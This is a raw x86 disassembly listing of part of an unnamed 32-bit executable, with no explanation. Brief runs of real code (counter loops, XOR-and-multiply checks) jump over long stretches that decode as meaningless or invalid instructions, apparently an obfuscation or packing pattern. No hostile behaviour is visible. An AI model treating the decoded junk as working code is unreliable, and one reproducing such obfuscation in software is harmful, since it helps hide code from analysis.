  40a7b4:	test   eax,0x58623ce
  40a7b9:	and    eax,0x7fc57e7e
  40a7be:	jle    0x40a83e
  40a7c0:	hlt    
  40a7c1:	retf   0x5387
  40a7c4:	xchg   edx,eax
  40a7c5:	inc    eax
  40a7c6:	cmp    al,0xd0
  40a7c8:	and    DWORD PTR [esi-0x3284aed8],edx
  40a7ce:	ret    
  40a7cf:	jge    0x40a804
  40a7d1:	aad    0x2a
  40a7d3:	outs   dx,BYTE PTR ds:[esi]
  40a7d4:	cmp    BYTE PTR [ebp-0x33ba5ae6],dh
  40a7da:	add    eax,0x366bde3e
  40a7df:	nop
  40a7e0:	aad    0x3e
  40a7e2:	stos   DWORD PTR es:[edi],eax
  40a7e3:	inc    esi
  40a7e4:	mov    dl,0x99
  40a7e6:	shr    DWORD PTR [esi+0x6475bedc],1
  40a7ec:	shl    BYTE PTR [esi],1
  40a7ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7ef:	dec    ebp
  40a7f0:	and    al,0x3d
  40a7f2:	cmp    al,BYTE PTR [edx+0xa990604]
  40a7f8:	sub    dl,bh
  40a7fa:	test   eax,0x902290bd
  40a7ff:	icebp  
  40a800:	push   0x354b6bcf
  40a805:	je     0x40a801
  40a807:	outs   dx,BYTE PTR ds:[esi]
  40a808:	out    dx,al
  40a809:	pop    ebp
  40a80a:	cs jo  0x40a88b
  40a80d:	sbb    ebp,DWORD PTR [eax]
  40a80f:	mov    ah,0xa9
  40a811:	js     0x40a85e
  40a813:	add    esp,esp
  40a815:	repnz arpl WORD PTR [eax],bx
  40a818:	push   ecx
  40a819:	jmp    0x2d0d:0x1f96adf6
  40a820:	cli    
  40a821:	pusha  
  40a822:	cwde   
  40a823:	xchg   edi,eax
  40a824:	or     eax,0xc02027c6
  40a829:	or     dh,BYTE PTR [esi+0x1cbb08cf]
  40a82f:	dec    eax
  40a830:	cmp    ebx,DWORD PTR [esi+0xb]
  40a833:	push   ebx
  40a834:	jge    0x40a8a1
  40a836:	jne    0x40a7fe
  40a838:	and    eax,0xbcdf8c8f
  40a83d:	call   0x1ad8ee4d
  40a842:	pop    es
  40a843:	jle    0x40a870
  40a845:	inc    ecx
  40a846:	fs pop ebx
  40a848:	mov    bl,0xb9
  40a84a:	xchg   DWORD PTR [ebx+0x2f],edi
  40a84d:	push   0xffffffa7
  40a84f:	xchg   DWORD PTR [ebx-0x23dde31a],edx
  40a855:	cwde   
  40a856:	pop    ds
  40a857:	pop    es
  40a858:	pop    eax
  40a859:	fild   DWORD PTR [ebx]
  40a85b:	(bad)  
  40a85c:	dec    ebp
  40a85d:	test   BYTE PTR [eax],al
  40a85f:	wrmsr  
  40a861:	outs   dx,BYTE PTR ds:[esi]
  40a862:	popa   
  40a863:	xor    DWORD PTR [ebp-0x627d09a4],esi
  40a869:	sbb    bh,BYTE PTR [edx]
  40a86b:	adc    edx,DWORD PTR [ebx]
  40a86d:	iret   
  40a86e:	mov    al,ds:0x61e463fa
  40a873:	mov    eax,0x50308beb
  40a878:	push   eax
  40a879:	sahf   
  40a87a:	jl     0x40a838
  40a87c:	add    al,0x46
  40a87e:	pop    ebp
  40a87f:	add    BYTE PTR [edx-0x51],0x0
  40a883:	add    bl,BYTE PTR [ebx]
  40a885:	mov    BYTE PTR ds:0xfc089b41,bh
  40a88b:	jb     0x40a8da
  40a88d:	(bad)  
  40a88e:	mov    bh,ah
  40a890:	cmp    al,0x14
  40a892:	out    dx,eax
  40a893:	add    al,0xf8
  40a895:	mov    eax,0xcaec7cff
  40a89a:	or     eax,0xa15de224
  40a89f:	call   0x4f2bd352
  40a8a4:	sbb    cl,BYTE PTR [ecx+eiz*4+0x3752f101]
  40a8ab:	into   
  40a8ac:	loop   0x40a896
  40a8ae:	(bad)
  40a8b1:	in     al,0x4d
  40a8b3:	jae    0x40a89e
  40a8b5:	outs   dx,BYTE PTR ds:[esi]
  40a8b6:	int    0x84
  40a8b8:	lods   al,BYTE PTR ds:[esi]
  40a8b9:	aad    0x45
  40a8bb:	lahf   
  40a8bc:	rol    al,cl
  40a8be:	sbb    eax,0x8a08a869
  40a8c3:	add    BYTE PTR [edx+0x14],0xc3
  40a8c7:	inc    ebx
  40a8c8:	mov    esp,0x3c6947b3
  40a8cd:	xor    al,0x4f
  40a8cf:	xchg   edi,eax
  40a8d0:	push   ecx
  40a8d1:	mov    WORD PTR [ebx-0x60],es
  40a8d4:	jns    0x40a890
  40a8d6:	or     ebx,DWORD PTR [eax]
  40a8d8:	cmp    BYTE PTR [eax-0x3fb77b18],dl
  40a8de:	popf   
  40a8df:	xchg   ecx,eax
  40a8e0:	pop    esi
  40a8e1:	adc    dl,BYTE PTR [eax+eax*1-0x4e]
  40a8e5:	pop    ebp
  40a8e6:	pop    ebx
  40a8e7:	mov    dl,0x1c
  40a8e9:	out    dx,al
  40a8ea:	jge    0x40a8ab
  40a8ec:	test   eax,0x3d7856e7
  40a8f1:	sub    edx,DWORD PTR es:[ecx-0x24aaa706]
  40a8f8:	xor    DWORD PTR [esi-0x53],0xfdc6c24a
  40a8ff:	nop
  40a900:	inc    esp
  40a901:	cmp    al,0x34
  40a903:	test   BYTE PTR [esi],ah
  40a905:	inc    ecx
  40a906:	sahf   
  40a907:	sub    ecx,ecx
  40a909:	pushf  
  40a90a:	cmp    BYTE PTR [edx],ch
  40a90c:	dec    ecx
  40a90d:	jbe    0x40a939
  40a90f:	loope  0x40a8b4
  40a911:	fsub   st(6),st
  40a913:	ja     0x40a8ba
  40a915:	icebp  
  40a916:	xor    bl,BYTE PTR [ecx-0x74e94f1b]
  40a91c:	inc    ebp
  40a91d:	cld    
  40a91e:	push   esi
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	dec    ebp
  40a9a7:	clc    
  40a9a8:	or     bh,0xe0
  40a9ab:	cmp    bh,BYTE PTR [esi+0x7e]
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40aa2e
  40a9b3:	mov    BYTE PTR [ecx],bl
  40a9b5:	repz pop ss
  40a9b7:	cli    
  40a9b8:	dec    esi
  40a9b9:	xchg   edx,eax
  40a9ba:	arpl   WORD PTR [ecx],sp
  40a9bc:	mov    edi,0x383d203f
  40a9c1:	xchg   esp,eax
  40a9c2:	and    dh,bh
  40a9c4:	jo     0x40aa17
  40a9c6:	js     0x40aa44
  40a9c8:	jle    0x40a9b1
  40a9ca:	pminub mm4,QWORD PTR [ebp-0x55c312c4]
  40a9d1:	push   ebx
  40a9d2:	xchg   edx,eax
  40a9d3:	jmp    0x40a99a
  40a9d5:	xor    DWORD PTR [edx+eiz*2],0x5b2de3d0
  40a9dc:	mov    edi,0xc2c7eff5
  40a9e1:	xchg   edi,eax
  40a9e2:	inc    edx
  40a9e3:	cs jecxz 0x40a9f9
  40a9e6:	repz adc ch,dh
  40a9e9:	push   esp
  40a9ea:	add    DWORD PTR [edx+0x15],ebp
  40a9ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9ee:	jnp    0x40aa4e
  40a9f0:	xchg   ebx,eax
  40a9f1:	int3   
  40a9f2:	add    al,0x24
  40a9f4:	test   eax,0x46783ec0
  40a9f9:	xchg   edx,eax
  40a9fa:	imul   ecx,esi,0x4d
  40a9fd:	jecxz  0x40aa54
  40a9ff:	jnp    0x40aa37
  40aa01:	je     0x40a9ba
  40aa03:	mov    bl,0xdb
  40aa05:	loope  0x40a99b
  40aa07:	inc    edi
  40aa08:	sub    dl,BYTE PTR [esi-0x5b]
  40aa0b:	inc    ecx
  40aa0c:	mov    esi,0x99ed044f
  40aa11:	or     BYTE PTR [esi+0x118a6039],ch
  40aa17:	lods   al,BYTE PTR ds:[esi]
  40aa18:	in     eax,dx
  40aa19:	push   eax
  40aa1a:	xchg   BYTE PTR [esi+esi*8-0x7877698d],dh
  40aa21:	cs imul ebx,ebx,0x903b1f0e
  40aa28:	xor    BYTE PTR [eax-0x6d67bcfa],bh
  40aa2e:	popa   
  40aa2f:	retf   
  40aa30:	(bad)  
  40aa31:	sub    BYTE PTR [edi-0x216f7315],al
  40aa37:	and    DWORD PTR [edx+edx*1+0x5c],edx
  40aa3b:	push   edx
  40aa3c:	xor    eax,0xb910f103
  40aa41:	in     al,0x82
  40aa43:	loopne 0x40aa56
  40aa45:	push   esi
  40aa46:	aam    0xb8
  40aa48:	push   ebp
  40aa49:	dec    edi
  40aa4a:	push   cs
  40aa4b:	lahf   
  40aa4c:	scas   al,BYTE PTR es:[edi]
  40aa4d:	or     ebp,DWORD PTR [ebp-0x5298b9b0]
  40aa53:	icebp  
  40aa54:	xchg   ebx,eax
  40aa55:	test   eax,0x9497bbfe
  40aa5a:	(bad)  
  40aa5b:	scas   al,BYTE PTR es:[edi]
  40aa5c:	das    
  40aa5d:	dec    BYTE PTR [ebp+0x7b750dcb]
  40aa63:	mov    al,0xaa
  40aa65:	mov    WORD PTR [eax+eiz*4],es
  40aa68:	scas   al,BYTE PTR es:[edi]
  40aa69:	sbb    DWORD PTR [esi-0x4cd642c0],edx
  40aa6f:	xchg   esi,eax
  40aa70:	sub    ecx,DWORD PTR [ecx]
  40aa72:	xor    al,0xe
  40aa74:	adc    BYTE PTR [eax],dl
  40aa76:	xchg   esp,eax
  40aa77:	clc    
  40aa78:	mov    al,0x59
  40aa7a:	sub    al,0x69
  40aa7c:	dec    al
  40aa7e:	inc    ebp
  40aa7f:	push   0xb49bbb1f
  40aa84:	xor    eax,0x4836a429
  40aa89:	out    dx,eax
  40aa8a:	emms   
  40aa8c:	lock or ebp,DWORD PTR [ebp-0x79]
  40aa90:	iret   
  40aa91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa92:	pop    esp
  40aa93:	push   0xfffffff2
  40aa95:	adc    esp,DWORD PTR cs:[bp+si+0x6d4a]
  40aa9b:	jmp    0xf850:0xb29f070
  40aaa2:	sbb    eax,0x7244debb
  40aaa7:	cmp    ebx,0xffffff92
  40aaaa:	pop    esi
  40aaab:	xchg   BYTE PTR [ebx+ebx*4-0x60],bl
  40aaaf:	lods   eax,DWORD PTR ds:[esi]
  40aab0:	jle    0x40aa58
  40aab2:	out    dx,al
  40aab3:	xchg   esp,eax
  40aab4:	sbb    esp,DWORD PTR [ebx]
  40aab6:	xchg   ebp,eax
  40aab7:	mov    BYTE PTR [ebx+0x6bf30fa1],ch
  40aabd:	add    ch,BYTE PTR [esi-0x56]
  40aac0:	in     al,dx
  40aac1:	ja     0x40aa83
  40aac3:	iret   
  40aac4:	jl     0x40aa81
  40aac6:	cld    
  40aac7:	lea    esi,[edi-0x28]
  40aaca:	rcl    BYTE PTR [edi+0x7e7b1236],cl
  40aad0:	hlt    
  40aad1:	sti    
  40aad2:	sbb    bh,BYTE PTR [edx+0x0]
  40aad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aad6:	dec    ebp
  40aad7:	ins    DWORD PTR es:[edi],dx
  40aad8:	mov    bh,0x5f
  40aada:	mov    ecx,0x2d9dde94
  40aadf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aae0:	dec    esp
  40aae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aae2:	mov    ecx,cs
  40aae4:	div    BYTE PTR [eax-0x56]
  40aae7:	inc    esp
  40aae8:	ss adc eax,0x907f5cb6
  40aaee:	daa    
  40aaef:	xchg   ebp,eax
  40aaf0:	inc    ecx
  40aaf1:	mov    dh,0x51
  40aaf3:	xor    BYTE PTR [esi+ebp*8+0x40],0x5e
  40aaf8:	outs   dx,DWORD PTR ds:[esi]
  40aaf9:	inc    eax
  40aafa:	mov    ebx,0x7c43a7ec
  40aaff:	cmp    eax,0x65e6aa1f
  40ab04:	jns    0x40aaec
  40ab06:	xchg   DWORD PTR [ebp+eiz*2-0x55fb5205],edi
  40ab0d:	xor    eax,edx
  40ab0f:	xor    esi,edx
  40ab11:	add    eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0x5b69ac8b
  40ab26:	and    eax,0x7e3b4f5f
  40ab2b:	jle    0x40aaf2
  40ab2d:	jg     0x40abad
  40ab2f:	jle    0x40ab38
  40ab31:	inc    edx
  40ab32:	ds xchg ecx,eax
  40ab34:	jl     0x40aaff
  40ab36:	mov    esi,0x98f394ff
  40ab3b:	mov    bh,0xd1
  40ab3d:	inc    eax
  40ab3e:	adc    dh,al
  40ab40:	dec    ebp
  40ab41:	fwait
  40ab42:	(bad)  
  40ab43:	pushw  0xa9de
  40ab47:	sub    esp,DWORD PTR [ebx-0x5b]
  40ab4a:	sti    
  40ab4b:	(bad)  
  40ab4c:	ja     0x40abb8
  40ab4e:	repz jmp 0x4b280820
  40ab54:	and    DWORD PTR [edi+0x2e],edx
  40ab57:	push   esp
  40ab58:	fnstcw WORD PTR [edx-0x71ec6328]
  40ab5e:	addr16 push edx
  40ab60:	inc    esp
  40ab61:	mov    ebp,0x5dbbeadc
  40ab66:	mov    ebx,DWORD PTR [edx+0x1a515b93]
  40ab6c:	sbb    DWORD PTR [ebx+0x37],esp
  40ab6f:	arpl   WORD PTR ds:0xb6144fad,sp
  40ab75:	imul   ecx,DWORD PTR [ecx+0x13447647],0x9e12362b
  40ab7f:	sbb    DWORD PTR [edx],edi
  40ab81:	jg     0x40abc5
  40ab83:	fst    QWORD PTR [esp+esi*4-0x41]
  40ab87:	pop    edi
  40ab88:	sub    eax,0x89447d0
  40ab8d:	adc    ebx,DWORD PTR [edi]
  40ab8f:	xlat   BYTE PTR ds:[ebx]
  40ab90:	frstor [ebx+0x4a]
  40ab93:	enter  0xf46,0x7b
  40ab97:	cmp    edi,ebp
  40ab99:	test   BYTE PTR [ecx+0x31ba19c8],bh
  40ab9f:	ja     0x40abb4
  40aba1:	icebp  
  40aba2:	in     al,0x7e
  40aba4:	loopne 0x40ab9c
  40aba6:	out    dx,al
  40aba7:	and    al,0x2a
  40aba9:	push   0xff974ffc
  40abae:	jbe    0x40ac1b
  40abb0:	cmp    edx,DWORD PTR [ecx-0x784fbc9b]
  40abb6:	adc    cl,BYTE PTR ds:[esi]
  40abb9:	or     eax,0xedbf715b
  40abbe:	xchg   ecx,eax
  40abbf:	arpl   WORD PTR [eax+0x7f],bx
  40abc2:	jmp    0x8c2f:0xc66fc4e2
  40abc9:	sahf   
  40abca:	enter  0xf2fb,0x59
  40abce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abcf:	in     al,0x8c
  40abd1:	clc    
  40abd2:	aas    
  40abd3:	popa   
  40abd4:	xchg   edi,eax
  40abd5:	and    DWORD PTR [ebp-0x4f],0x627fd33a
  40abdc:	cmp    esi,ecx
  40abde:	leave  
  40abdf:	das    
  40abe0:	pop    ebx
  40abe1:	mov    ds:0x1dfd5c2c,al
  40abe6:	push   ebx
  40abe7:	das    
  40abe8:	cvtps2pd xmm7,QWORD PTR [edx-0x2d]
  40abec:	mov    WORD PTR [ecx+ebx*2+0x6e],cs
  40abf0:	adc    esi,0xffffff9f
  40abf3:	mov    cl,0xbf
  40abf5:	stos   DWORD PTR es:[edi],eax
  40abf6:	nop
  40abf7:	aaa    
  40abf8:	mov    ebp,0x3fbb22a8
  40abfd:	mov    edx,0xe1ec39fd
  40ac02:	xlat   BYTE PTR ds:[ebx]
  40ac03:	lock loop 0x40ac00
  40ac06:	outs   dx,DWORD PTR ds:[esi]
  40ac07:	mov    dh,0xaa
  40ac09:	sbb    bl,BYTE PTR [ecx-0x1b]
  40ac0c:	cmc    
  40ac0d:	push   edx
  40ac0e:	cmp    BYTE PTR [eax+esi*1],al
  40ac11:	pop    es
  40ac12:	add    bl,BYTE PTR [eax+edi*1-0x1e559291]
  40ac19:	jno    0x40abfe
  40ac1b:	loopne 0x40ac5f
  40ac1d:	and    BYTE PTR [ebp+0x3a],0x13
  40ac21:	in     eax,0x46
  40ac23:	ja     0x40ac96
  40ac25:	push   esp
  40ac26:	scas   eax,DWORD PTR es:[edi]
  40ac27:	(bad)  
  40ac28:	in     eax,dx
  40ac29:	cmc    
  40ac2a:	xor    eax,0xfedb102d
  40ac2f:	inc    ebp
  40ac30:	sahf   
  40ac31:	pop    esi
  40ac32:	jmp    0x19c337e1
  40ac37:	jno    0x40aca9
  40ac39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac3a:	pop    ss
  40ac3b:	dec    ebp
  40ac3c:	jae    0x40ac73
  40ac3e:	or     eax,0xc5757209
  40ac43:	shl    BYTE PTR [ebp-0x16],0xbc
  40ac47:	cdq    
  40ac48:	cmp    BYTE PTR [esi],dl
  40ac4a:	enter  0x68d2,0x1d
  40ac4e:	js     0x36f0283a
  40ac54:	sbb    al,BYTE PTR [edx]
  40ac56:	add    esp,DWORD PTR [ecx]
  40ac58:	leave  
  40ac59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac5a:	loopne 0x40ac31
  40ac5c:	stc    
  40ac5d:	or     ecx,DWORD PTR [esi-0x44]
  40ac60:	ins    DWORD PTR es:[edi],dx
  40ac61:	ror    edx,cl
  40ac63:	dec    esi
  40ac64:	cs addr16 mov edx,0xeabc4af7
  40ac6b:	adc    DWORD PTR [esi],eax
  40ac6d:	jg     0x40abfa
  40ac6f:	in     eax,dx
  40ac70:	jbe    0x40acd2
  40ac72:	xor    esi,DWORD PTR [edx]
  40ac74:	ret    0x163a
  40ac77:	cmp    al,0xa3
  40ac79:	shr    DWORD PTR [edx+edi*8-0x65ff3b3b],0xa6
  40ac81:	pop    es
  40ac82:	push   esi
  40ac83:	lods   al,BYTE PTR ds:[esi]
  40ac84:	(bad)  [esi-0x3cb8f677]
  40ac8a:	ja     0x40ac8f
  40ac8c:	icebp  
  40ac8d:	imul   eax,esi
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    edi,DWORD PTR [ebx+0x2adbd4b0]
  40acc0:	cmp    DWORD PTR [esi+0x7e],edi
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40ad19
  40acc8:	mov    ebp,0xe246eae9
  40accd:	xchg   ebx,eax
  40acce:	addr16 mov dl,0x4d
  40acd1:	mov    DWORD PTR [edx-0x5a],esi
  40acd4:	in     al,0x6f
  40acd6:	cwde   
  40acd7:	xor    bl,BYTE PTR [ebx-0x6854302e]
  40acdd:	or     al,0x16
  40acdf:	es (bad) 
  40ace1:	loop   0x40ad09
  40ace3:	fisubr WORD PTR [edi+0x4e94dd82]
  40ace9:	add    DWORD PTR [ecx+0x48],0x27
  40aced:	pop    edi
  40acee:	in     al,dx
  40acef:	mov    dl,0x5f
  40acf1:	inc    ecx
  40acf2:	aaa    
  40acf3:	inc    ecx
  40acf4:	sbb    al,0xdc
  40acf6:	imul   ebp,DWORD PTR [ecx+0x50],0x14
  40acfa:	xor    al,0xc1
  40acfc:	dec    ebp
  40acfd:	das    
  40acfe:	mov    ds:0x650a5c8c,eax
  40ad03:	mov    dh,BYTE PTR ds:[eax-0x1c]
  40ad07:	and    BYTE PTR [edi+0xddf9d02],bh
  40ad0d:	loopne 0x40acf8
  40ad0f:	push   ebx
  40ad10:	(bad)  
  40ad11:	outs   dx,BYTE PTR ds:[esi]
  40ad12:	lods   al,BYTE PTR ds:[esi]
  40ad13:	je     0x40acfe
  40ad15:	or     DWORD PTR [edi],eax
  40ad17:	dec    ebx
  40ad18:	xor    esi,DWORD PTR [esi+0x4aafaea]
  40ad1e:	out    dx,eax
  40ad1f:	mov    DWORD PTR [ecx+0x5b4df425],0x7d5b3de5
  40ad29:	sub    BYTE PTR [ebx],bl
  40ad2b:	adc    eax,DWORD PTR [eax]
  40ad2d:	outs   dx,BYTE PTR ds:[esi]
  40ad2e:	cdq    
  40ad2f:	call   0x854613cb
  40ad34:	lods   eax,DWORD PTR ds:[esi]
  40ad35:	jle    0x40ad3f
  40ad37:	ror    bh,0x33
  40ad3a:	aam    0xae
  40ad3c:	add    DWORD PTR [ecx+0x4e7679b3],0x3b095326
  40ad46:	loope  0x40ad1c
  40ad48:	popf   
  40ad49:	xchg   edx,eax
  40ad4a:	dec    ecx
  40ad4b:	dec    ecx
  40ad4c:	cmp    DWORD PTR ds:0x7aa120ce,ebx
  40ad52:	out    0xb7,al
  40ad54:	push   ebx
  40ad55:	(bad)  
  40ad56:	dec    ebx
  40ad57:	cwde   
  40ad58:	jns    0x40add5
  40ad5a:	out    0x7c,al
  40ad5c:	push   edx
  40ad5d:	rcl    DWORD PTR [edx+edi*2+0x1e6c7432],cl
  40ad64:	jbe    0x40adac
  40ad66:	mov    fs,WORD PTR [ecx]
  40ad68:	sub    DWORD PTR [eax],esi
  40ad6a:	jecxz  0x40ad69
  40ad6c:	fistp  QWORD PTR [esi+0x30b4cd6e]
  40ad72:	add    ch,bh
  40ad74:	hlt    
  40ad75:	pop    edx
  40ad76:	idiv   DWORD PTR [edi-0x2b]
  40ad79:	inc    eax
  40ad7a:	push   es
  40ad7b:	xor    al,0xb
  40ad7d:	add    al,cl
  40ad7f:	adc    al,0x37
  40ad81:	popa   
  40ad82:	xor    BYTE PTR [esi],cl
  40ad84:	mov    ch,0xf
  40ad86:	push   cs
  40ad87:	mov    eax,ds:0x3b18523b
  40ad8c:	sub    dh,BYTE PTR [ebx-0xe]
  40ad8f:	mov    eax,ds:0xde45b4f3
  40ad94:	and    eax,0x61c16a87
  40ad99:	out    0xf7,eax
  40ad9b:	push   ebp
  40ad9c:	xlat   BYTE PTR ds:[ebx]
  40ad9d:	push   eax
  40ad9e:	push   cs
  40ad9f:	xchg   BYTE PTR [edx],ch
  40ada1:	adc    DWORD PTR [ecx+0x1e],esi
  40ada4:	fwait
  40ada5:	pop    ss
  40ada6:	daa    
  40ada7:	push   esp
  40ada8:	jl     0x40ad47
  40adaa:	inc    eax
  40adab:	fisttp QWORD PTR [ebp-0x45]
  40adae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adaf:	mov    cl,0x6c
  40adb1:	pop    ss
  40adb2:	shr    BYTE PTR [eax-0x5739a986],cl
  40adb8:	xchg   BYTE PTR [edi+0x86affb3],bh
  40adbe:	sub    eax,0x3f89e588
  40adc3:	ja     0x40ad58
  40adc5:	leave  
  40adc6:	xor    eax,0x9f3fa9f0
  40adcb:	scas   eax,DWORD PTR es:[edi]
  40adcc:	jo     0x40ae46
  40adce:	xor    DWORD PTR [esi-0x14],ebp
  40add1:	std    
  40add2:	mov    bl,0x4c
  40add4:	inc    eax
  40add5:	fsubr  st,st(4)
  40add7:	or     eax,0x8deb7047
  40addc:	xchg   ebx,eax
  40addd:	cmp    ah,BYTE PTR [ecx]
  40addf:	popa   
  40ade0:	shr    ebx,0xd9
  40ade3:	jmp    0x40add3
  40ade5:	pop    esp
  40ade6:	sbb    esi,DWORD PTR [edx-0x7ec2e1f8]
  40adec:	in     eax,dx
  40aded:	adc    DWORD PTR [edx+0x53],0x21
  40adf1:	adc    edi,DWORD PTR [edi]
  40adf3:	and    esp,DWORD PTR [ebx]
  40adf5:	(bad)  
  40adf6:	fadd   DWORD PTR [esi-0x46]
  40adf9:	dec    esi
  40adfa:	dec    edx
  40adfb:	mov    ds:0x47444e93,al
  40ae00:	sub    esp,esi
  40ae02:	xchg   BYTE PTR [ebx],dl
  40ae04:	sub    eax,0xb9a8a035
  40ae09:	mov    ch,0xba
  40ae0b:	daa    
  40ae0c:	jge    0x40ae76
  40ae0e:	cmp    al,0x7f
  40ae10:	iret   
  40ae11:	jge    0x40ae90
  40ae13:	adc    BYTE PTR [ebp-0x69],al
  40ae16:	mov    esi,0x63a66e6e
  40ae1b:	or     eax,0xffffff8f
  40ae1e:	jns    0x40adff
  40ae20:	inc    ecx
  40ae21:	inc    ebp
  40ae22:	add    esi,ecx
  40ae24:	imul   eax,esi
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0x54268d5d
  40ae94:	sub    BYTE PTR [ecx+0x7e3ef1ae],ch
  40ae9a:	jle    0x40ae52
  40ae9c:	jle    0x40af1c
  40ae9e:	jle    0x40ae62
  40aea0:	cmp    ecx,DWORD PTR [edi+0xd]
  40aea3:	inc    ecx
  40aea4:	mov    edx,0x14a6b738
  40aea9:	pop    ds
  40aeaa:	shl    BYTE PTR [esi+0x7d],0x78
  40aeae:	cwde   
  40aeaf:	sbb    dh,BYTE PTR [ebp+0x6b]
  40aeb2:	jb     0x40aefc
  40aeb4:	(bad)  
  40aeb5:	xlat   BYTE PTR ds:[ebx]
  40aeb6:	adc    DWORD PTR [edx-0x63],esp
  40aeb9:	jns    0x40ae70
  40aebb:	inc    ebp
  40aebc:	jns    0x40ae83
  40aebe:	out    0x18,eax
  40aec0:	retf   0x96f6
  40aec3:	in     al,dx
  40aec4:	jb     0x40aeab
  40aec6:	jnp    0x40ae9d
  40aec8:	bnd jb 0x40aed6
  40aecb:	adc    dl,dh
  40aecd:	retf   0xe0f2
  40aed0:	lods   al,BYTE PTR ds:[esi]
  40aed1:	xor    bh,BYTE PTR [esi+eiz*2]
  40aed4:	or     ebx,edx
  40aed6:	and    ebp,DWORD PTR [ecx+0x43e4fe51]
  40aedc:	cld    
  40aedd:	aas    
  40aede:	add    eax,edx
  40aee0:	jae    0x40ae70
  40aee2:	jmp    0x40aebf
  40aee4:	jnp    0x40af27
  40aee6:	mov    esp,DWORD PTR [edx+eax*1]
  40aee9:	lahf   
  40aeea:	popa   
  40aeeb:	sbb    di,0x61
  40aeef:	or     dh,BYTE PTR [edi-0x44efaa34]
  40aef5:	(bad)  
  40aef6:	leave  
  40aef7:	daa    
  40aef8:	sub    ecx,DWORD PTR [esi+eax*8-0x4bbc8e2e]
  40aeff:	aaa    
  40af00:	sub    BYTE PTR [ecx],dl
  40af02:	cmp    DWORD PTR [eax-0x53],ecx
  40af05:	jnp    0x40af81
  40af07:	call   0xbf62:0x29a5dc68
  40af0e:	fisub  DWORD PTR [esp+eiz*2-0x7f384be8]
  40af15:	gs sbb eax,0xda1a9775
  40af1b:	dec    ecx
  40af1c:	mov    ebp,0x4255641a
  40af21:	push   ebp
  40af22:	les    edi,FWORD PTR [ecx]
  40af24:	jae    0x40aec3
  40af26:	hlt    
  40af27:	pop    ecx
  40af28:	pusha  
  40af29:	std    
  40af2a:	cmp    DWORD PTR [esi+0x22298ff5],ebx
  40af30:	mov    dh,0x98
  40af32:	or     DWORD PTR ds:0xf5d53ae6,eax
  40af38:	gs mov bh,0xa
  40af3b:	cs push 0x7b
  40af3e:	das    
